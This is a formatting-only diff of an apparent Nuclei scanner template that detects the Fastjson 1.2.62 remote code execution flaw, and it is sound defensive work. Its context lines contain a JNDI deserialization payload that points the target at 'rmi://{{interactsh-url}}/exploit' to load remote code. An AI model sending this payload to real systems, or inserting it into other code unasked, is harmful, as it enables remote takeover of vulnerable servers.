@@ -1,5 +1,4 @@
 id: fastjson-1-2-62-rce
-
 info:
   name: Fastjson 1.2.62 - Remote Code Execution
   author: zh
@@ -13,7 +12,6 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-77
   tags: fastjson,rce,deserialization,oast
-
 requests:
   - raw:
       - |
@@ -25,14 +23,12 @@ requests:
            "@type":"org.apache.xbean.propertyeditor.JndiConverter",
            "AsText":"rmi://{{interactsh-url}}/exploit"
         }
-
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol   # Confirms DNS Interaction
+        part: interactsh_protocol # Confirms DNS Interaction
         words:
           - "dns"
-
       - type: status
         negative: true
         status:
